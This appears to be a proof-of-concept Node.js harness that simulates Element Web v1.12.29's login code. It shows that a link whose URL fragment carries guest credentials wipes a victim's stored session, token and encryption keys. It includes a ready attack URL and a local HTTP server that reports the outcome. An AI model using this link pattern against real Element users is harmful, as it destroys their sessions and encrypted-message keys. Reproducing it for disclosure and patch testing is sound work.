"use strict";

/**
 * Gadget of Element Web v1.12.29 Lifecycle.loadSession guest-fragment leftover.
 * Copies parseAppUrl, loadSession guest-first, doSetLoggedIn(clearStorage=true)
 * before any whoami. Not a live Element client; loopback oracle only.
 */

const fs = require("node:fs");
const http = require("node:http");
const path = require("node:path");
const { URL } = require("node:url");

const LISTEN_HOST = "0.0.0.0";
const LISTEN_PORT = 19600;
const WITNESS = "ELEMENT-FRAGMENT-GUEST-WITNESS";
const PIN_DIR = path.join(__dirname, "pin-src");
const PIN_VERSION = "v1.12.29";

const HOMESERVER_URL_KEY = "mx_hs_url";
const ID_SERVER_URL_KEY = "mx_is_url";
const ACCESS_TOKEN_STORAGE_KEY = "mx_access_token";
const HAS_ACCESS_TOKEN_STORAGE_KEY = "mx_has_access_token";

const DEFAULT_HS = "https://matrix-client.matrix.org";
const DEFAULT_IS = "https://vector.im";
const VICTIM_USER = "@victim:example.org";
const VICTIM_TOKEN = "syt_victim_real_session_token";
const VICTIM_DEVICE = "DEVICEVICTIM";
const VICTIM_PICKLE = "victim-pickle-key";
const VICTIM_OLM = "victim-olm-account";
const GUEST_USER = "@x:example.org";
const GUEST_TOKEN = "not-a-real-token";
const DEFAULT_ATTACK =
    "http://127.0.0.1:19600/#/home?guest_user_id=@x:example.org&guest_access_token=not-a-real-token";

const urlParameterConfig = {
    legacy_sso: { keys: ["loginToken"], location: "query" },
    oauth2: { keys: ["code", "state"], location: "fragment" },
    threepid: {
        keys: ["client_secret", "session_id", "hs_url", "is_url", "sid"],
        location: "fragment",
    },
    defaults: { keys: ["defaultUsername"], location: "fragment" },
    guest: { keys: ["guest_user_id", "guest_access_token"], location: "fragment" },
};

class MemoryStorage {
    constructor() {
        this.map = new Map();
    }

    getItem(key) {
        return this.map.has(key) ? this.map.get(key) : null;
    }

    setItem(key, value) {
        this.map.set(String(key), String(value));
    }

    removeItem(key) {
        this.map.delete(key);
    }

    clear() {
        this.map.clear();
    }

    snapshot() {
        return Object.fromEntries(this.map.entries());
    }
}

class IdbAccount {
    constructor() {
        this.map = new Map();
    }

    async save(key, value) {
        this.map.set(key, value);
    }

    async load(key) {
        return this.map.has(key) ? this.map.get(key) : undefined;
    }

    async clear() {
        this.map.clear();
    }

    snapshot() {
        return Object.fromEntries(this.map.entries());
    }
}

class CryptoStore {
    constructor() {
        this.map = new Map();
    }

    set(key, value) {
        this.map.set(key, value);
    }

    get(key) {
        return this.map.has(key) ? this.map.get(key) : undefined;
    }

    async clear() {
        this.map.clear();
    }

    get empty() {
        return this.map.size === 0;
    }

    snapshot() {
        return Object.fromEntries(this.map.entries());
    }
}

function newBrowser() {
    return {
        localStorage: new MemoryStorage(),
        sessionStorage: new MemoryStorage(),
        account: new IdbAccount(),
        crypto: new CryptoStore(),
        logs: [],
        whoamiCalls: [],
        sessionLockStolen: false,
    };
}

function log(browser, ...parts) {
    browser.logs.push(parts.map(String).join(" "));
}

function parseQsFromFragment(url) {
    const fragment = url.hash.substring(1);
    const [main, query] = fragment.split("?", 2);
    if (main.includes("=")) {
        return { location: "", params: new URLSearchParams(main) };
    }
    return {
        location: decodeURIComponent(main),
        params: query ? new URLSearchParams(query) : undefined,
    };
}

function parseAppUrl(url) {
    const queryParams = new URLSearchParams(url.search);
    const parsedFragment = parseQsFromFragment(url);
    const urlParams = {};
    for (const group of Object.keys(urlParameterConfig)) {
        const groupConfig = urlParameterConfig[group];
        const params = groupConfig.location === "fragment" ? parsedFragment.params : queryParams;
        if (!params) {
            continue;
        }
        const target = {};
        for (const key of groupConfig.keys) {
            const value = params.get(key);
            if (value !== null) {
                target[key] = value;
            }
        }
        if (Object.keys(target).length > 0) {
            urlParams[group] = target;
        }
    }
    return { params: urlParams, location: parsedFragment.location };
}

async function getStoredToken(browser, storageKey) {
    let token = await browser.account.load(storageKey);
    if (!token) {
        token = browser.localStorage.getItem(storageKey) ?? undefined;
        if (token) {
            await browser.account.save(storageKey, token);
            browser.localStorage.removeItem(storageKey);
        }
    }
    return token;
}

async function getStoredSessionVars(browser) {
    const hsUrl = browser.localStorage.getItem(HOMESERVER_URL_KEY) ?? undefined;
    const isUrl = browser.localStorage.getItem(ID_SERVER_URL_KEY) ?? undefined;
    const accessToken = await getStoredToken(browser, ACCESS_TOKEN_STORAGE_KEY);
    const hasAccessToken =
        browser.localStorage.getItem(HAS_ACCESS_TOKEN_STORAGE_KEY) === "true" || !!accessToken;
    const userId = browser.localStorage.getItem("mx_user_id") ?? undefined;
    const deviceId = browser.localStorage.getItem("mx_device_id") ?? undefined;
    let isGuest;
    if (browser.localStorage.getItem("mx_is_guest") !== null) {
        isGuest = browser.localStorage.getItem("mx_is_guest") === "true";
    } else {
        isGuest = browser.localStorage.getItem("matrix-is-guest") === "true";
    }
    return { hsUrl, isUrl, hasAccessToken, accessToken, userId, deviceId, isGuest };
}

async function persistTokens(browser, credentials) {
    await browser.account.save(ACCESS_TOKEN_STORAGE_KEY, credentials.accessToken);
    browser.localStorage.setItem(HAS_ACCESS_TOKEN_STORAGE_KEY, "true");
}

async function persistCredentials(browser, credentials) {
    browser.localStorage.setItem(HOMESERVER_URL_KEY, credentials.homeserverUrl);
    if (credentials.identityServerUrl) {
        browser.localStorage.setItem(ID_SERVER_URL_KEY, credentials.identityServerUrl);
    }
    browser.localStorage.setItem("mx_user_id", credentials.userId);
    browser.localStorage.setItem("mx_is_guest", JSON.stringify(credentials.guest));
    await persistTokens(browser, credentials);
    if (credentials.deviceId) {
        browser.localStorage.setItem("mx_device_id", credentials.deviceId);
    }
    log(browser, `Session persisted for ${credentials.userId}`);
}

async function clearStorage(browser) {
    log(browser, "INFO Clearing storage, deleteEverything=undefined");
    browser.localStorage.clear();
    await browser.account.clear();
    browser.sessionStorage.clear();
    await browser.crypto.clear();
}

async function doSetLoggedIn(browser, credentials, clearStorageEnabled, isFreshLogin) {
    credentials.guest = Boolean(credentials.guest);
    log(
        browser,
        "setLoggedIn: mxid: " +
            credentials.userId +
            " deviceId: " +
            credentials.deviceId +
            " guest: " +
            credentials.guest +
            " hs: " +
            credentials.homeserverUrl +
            " softLogout: false",
        " freshLogin: " + credentials.freshLogin,
    );
    if (clearStorageEnabled) {
        await clearStorage(browser);
    }
    await persistCredentials(browser, credentials);
    return { userId: credentials.userId, guest: credentials.guest, isFreshLogin };
}

async function restoreSessionFromStorage(browser, opts) {
    const ignoreGuest = opts?.ignoreGuest;
    const { hsUrl, isUrl, hasAccessToken, accessToken, userId, deviceId, isGuest } =
        await getStoredSessionVars(browser);
    if (hasAccessToken && !accessToken) {
        return false;
    }
    if (accessToken && userId && hsUrl) {
        if (ignoreGuest && isGuest) {
            log(browser, "Ignoring stored guest account: " + userId);
            return false;
        }
        log(browser, `Restoring session for ${userId}`);
        await doSetLoggedIn(
            browser,
            {
                userId,
                deviceId,
                accessToken,
                homeserverUrl: hsUrl,
                identityServerUrl: isUrl,
                guest: isGuest,
            },
            false,
            false,
        );
        return true;
    }
    log(browser, "No previous session found.");
    return false;
}

async function loadSession(browser, opts) {
    let enableGuest = opts.enableGuest || false;
    const guestHsUrl = opts.guestHsUrl;
    const guestIsUrl = opts.guestIsUrl;
    const urlParams = opts.urlParams;
    if (enableGuest && !guestHsUrl) {
        log(browser, "WARN Cannot enable guest access: can't determine HS URL to use");
        enableGuest = false;
    }
    if (enableGuest && guestHsUrl && urlParams?.guest?.guest_user_id && urlParams?.guest?.guest_access_token) {
        const stored = await getStoredSessionVars(browser);
        if (opts.patched && stored.hasAccessToken && stored.userId && stored.isGuest === false) {
            log(browser, "Ignoring guest fragment because a non-guest session exists");
        } else {
            log(browser, "Using guest access credentials");
            await doSetLoggedIn(
                browser,
                {
                    userId: urlParams.guest.guest_user_id,
                    accessToken: urlParams.guest.guest_access_token,
                    homeserverUrl: guestHsUrl,
                    identityServerUrl: guestIsUrl,
                    guest: true,
                },
                true,
                false,
            );
            return true;
        }
    }
    return restoreSessionFromStorage(browser, { ignoreGuest: Boolean(opts.ignoreGuest) });
}

async function seedVictim(browser) {
    browser.localStorage.setItem(HOMESERVER_URL_KEY, DEFAULT_HS);
    browser.localStorage.setItem(ID_SERVER_URL_KEY, DEFAULT_IS);
    browser.localStorage.setItem("mx_user_id", VICTIM_USER);
    browser.localStorage.setItem("mx_device_id", VICTIM_DEVICE);
    browser.localStorage.setItem("mx_is_guest", "false");
    browser.localStorage.setItem(HAS_ACCESS_TOKEN_STORAGE_KEY, "true");
    await browser.account.save(ACCESS_TOKEN_STORAGE_KEY, VICTIM_TOKEN);
    browser.crypto.set("pickle", VICTIM_PICKLE);
    browser.crypto.set("olm", VICTIM_OLM);
}

function pinCheck() {
    const lifecycle = fs.readFileSync(path.join(PIN_DIR, "Lifecycle.ts"), "utf8");
    const urlUtils = fs.readFileSync(path.join(PIN_DIR, "url_utils.ts"), "utf8");
    const app = fs.readFileSync(path.join(PIN_DIR, "app.tsx"), "utf8");
    const matrixChat = fs.readFileSync(path.join(PIN_DIR, "MatrixChat.tsx"), "utf8");
    const config = fs.readFileSync(path.join(PIN_DIR, "config.json"), "utf8");
    return {
        pin_ok:
            lifecycle.includes("Using guest access credentials") &&
            lifecycle.includes("urlParams?.guest?.guest_user_id") &&
            lifecycle.includes("urlParams?.guest?.guest_access_token") &&
            lifecycle.includes("if (clearStorageEnabled)") &&
            lifecycle.includes("await clearStorage()") &&
            urlUtils.includes('keys: ["guest_user_id", "guest_access_token"]') &&
            urlUtils.includes('location: "fragment"') &&
            app.includes("enableGuest={!config.disable_guests}") &&
            !JSON.parse(config).disable_guests &&
            matrixChat.includes("enableGuest: this.props.enableGuest") &&
            matrixChat.includes("guestHsUrl: this.getServerProperties().serverConfig.hsUrl"),
        guest_fragment_first: lifecycle.includes("Using guest access credentials"),
        clear_storage_before_whoami:
            lifecycle.includes("if (clearStorageEnabled)") && lifecycle.includes("await clearStorage()"),
        guest_keys_in_fragment: urlUtils.includes('keys: ["guest_user_id", "guest_access_token"]'),
        enable_guest_default_on: app.includes("enableGuest={!config.disable_guests}"),
        config_disable_guests: Object.prototype.hasOwnProperty.call(JSON.parse(config), "disable_guests"),
        token_login_strips_guest: app.includes("guest_access_token") && app.includes("searchParams.delete"),
        version: PIN_VERSION,
        witness: WITNESS,
    };
}

function snapshotSession(browser) {
    const local = browser.localStorage.snapshot();
    const account = browser.account.snapshot();
    return {
        mx_user_id: local.mx_user_id ?? null,
        mx_is_guest: local.mx_is_guest ?? null,
        mx_device_id: local.mx_device_id ?? null,
        access_token: account[ACCESS_TOKEN_STORAGE_KEY] ?? local[ACCESS_TOKEN_STORAGE_KEY] ?? null,
        crypto_empty: browser.crypto.empty,
        crypto: browser.crypto.snapshot(),
        local_keys: Object.keys(local).sort(),
    };
}

async function runOpen(body) {
    const attackUrl = typeof body.url === "string" && body.url ? body.url : DEFAULT_ATTACK;
    const disableGuests = body.disable_guests === true || body.disable_guests === "1";
    const patched = body.patched === true || body.patched === "1";
    const seed = body.seed !== false && body.seed !== "0";
    const parsedUrl = new URL(attackUrl);
    const parsed = parseAppUrl(parsedUrl);
    const browser = newBrowser();
    const before = { mx_user_id: null, crypto_empty: true, access_token: null };
    if (seed) {
        await seedVictim(browser);
        const seeded = snapshotSession(browser);
        before.mx_user_id = seeded.mx_user_id;
        before.crypto_empty = seeded.crypto_empty;
        before.access_token = seeded.access_token;
    }
    const enableGuest = !disableGuests;
    const loaded = await loadSession(browser, {
        enableGuest,
        guestHsUrl: DEFAULT_HS,
        guestIsUrl: DEFAULT_IS,
        urlParams: parsed.params,
        patched,
    });
    const after = snapshotSession(browser);
    const usedGuest = browser.logs.includes("Using guest access credentials");
    const priorKept =
        after.mx_user_id === VICTIM_USER &&
        after.access_token === VICTIM_TOKEN &&
        after.crypto_empty === false;
    const priorGone = after.mx_user_id !== VICTIM_USER && after.access_token !== VICTIM_TOKEN;
    const guestPersisted =
        after.mx_user_id === GUEST_USER &&
        after.access_token === GUEST_TOKEN &&
        after.mx_is_guest === "true";
    return {
        how: "gadget",
        product: "Element Web",
        version: PIN_VERSION,
        url: attackUrl,
        fragment: parsedUrl.hash,
        location: parsed.location,
        guest_params: parsed.params.guest || null,
        disable_guests: disableGuests,
        enable_guest: enableGuest,
        patched,
        loaded,
        used_guest: usedGuest,
        whoami_called: browser.whoamiCalls.length > 0,
        whoami_calls: browser.whoamiCalls,
        prior_user: before.mx_user_id,
        prior_token_present: before.access_token === VICTIM_TOKEN,
        prior_crypto_empty: before.crypto_empty,
        after_user: after.mx_user_id,
        after_guest: after.mx_is_guest,
        after_token: after.access_token,
        crypto_empty: after.crypto_empty,
        prior_session_kept: priorKept,
        prior_session_gone: priorGone,
        guest_persisted: guestPersisted,
        garbage_token: after.access_token === GUEST_TOKEN,
        logs: browser.logs,
        witness: WITNESS,
    };
}

function jsonResponse(res, status, payload) {
    const body = JSON.stringify(payload);
    res.writeHead(status, {
        "Content-Type": "application/json; charset=utf-8",
        "Cache-Control": "no-store",
        "Content-Length": Buffer.byteLength(body),
    });
    res.end(body);
}

function readBody(req) {
    return new Promise((resolve, reject) => {
        const chunks = [];
        req.on("data", (chunk) => chunks.push(chunk));
        req.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));
        req.on("error", reject);
    });
}

function parseOpenInput(reqUrl, rawBody) {
    const query = {};
    for (const [key, value] of reqUrl.searchParams.entries()) {
        query[key] = value;
    }
    if (rawBody) {
        try {
            const parsed = JSON.parse(rawBody);
            if (parsed && typeof parsed === "object") {
                return { ...query, ...parsed };
            }
        } catch {
            return query;
        }
    }
    return query;
}

async function handle(req, res) {
    const reqUrl = new URL(req.url || "/", `http://${req.headers.host || "127.0.0.1"}`);
    const pathname = reqUrl.pathname;
    if (pathname === "/ping") {
        jsonResponse(res, 200, { ok: true, pong: true, witness: WITNESS, version: PIN_VERSION });
        return;
    }
    if (pathname === "/pin") {
        jsonResponse(res, 200, pinCheck());
        return;
    }
    if (pathname === "/open") {
        const raw = req.method === "POST" || req.method === "PUT" ? await readBody(req) : "";
        const input = parseOpenInput(reqUrl, raw);
        const result = await runOpen(input);
        jsonResponse(res, 200, result);
        return;
    }
    jsonResponse(res, 404, { error: "not-found" });
}

const server = http.createServer((req, res) => {
    handle(req, res).catch((err) => {
        jsonResponse(res, 500, { error: String(err && err.message ? err.message : err) });
    });
});

server.listen(LISTEN_PORT, LISTEN_HOST, () => {
    process.stdout.write(`element-fragment-guest gadget on ${LISTEN_HOST}:${LISTEN_PORT}\n`);
});
